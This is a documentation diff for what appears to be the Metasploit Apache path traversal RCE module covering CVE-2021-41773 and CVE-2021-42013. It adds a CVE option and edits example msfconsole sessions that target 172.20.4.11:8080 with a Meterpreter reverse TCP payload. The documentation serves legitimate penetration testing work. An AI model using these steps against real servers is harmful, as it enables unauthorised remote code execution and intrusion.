@@ -49,6 +49,10 @@ docker start CVE-2021-42013
 
 ## Options
 
+**CVE**
+
+The vulnerability to use (Accepted: CVE-2021-41773, CVE-2021-42013). Default: CVE-2021-42013
+
 **DEPTH**
 
 Depth for path traversal. Default: 5
@@ -66,8 +70,8 @@ msf6 exploit(multi/http/apache_normalize_path_rce) > use exploit/multi/http/apac
 [*] Using configured payload linux/x64/meterpreter/reverse_tcp
 msf6 exploit(multi/http/apache_normalize_path_rce) > set target 1
 target => 1
-msf6 exploit(multi/http/apache_normalize_path_rce) > setg RHOSTS 172.20.4.11
-RHOSTS => 172.20.4.11
+msf6 exploit(multi/http/apache_normalize_path_rce) > setg rhosts 172.20.4.11
+rhosts => 172.20.4.11
 msf6 exploit(multi/http/apache_normalize_path_rce) > setg rport 8080
 rport => 8080
 msf6 exploit(multi/http/apache_normalize_path_rce) > setg ssl false
@@ -95,8 +99,8 @@ msf6 exploit(multi/http/apache_normalize_path_rce) >
 ```
 msf6 exploit(multi/http/apache_normalize_path_rce) > use exploit/multi/http/apache_normalize_path_rce
 [*] Using configured payload linux/x64/meterpreter/reverse_tcp
-msf6 exploit(multi/http/apache_normalize_path_rce) > setg RHOSTS 172.20.4.11
-RHOSTS => 172.20.4.11
+msf6 exploit(multi/http/apache_normalize_path_rce) > setg rhosts 172.20.4.11
+rhosts => 172.20.4.11
 msf6 exploit(multi/http/apache_normalize_path_rce) > setg rport 8080
 rport => 8080
 msf6 exploit(multi/http/apache_normalize_path_rce) > setg ssl false
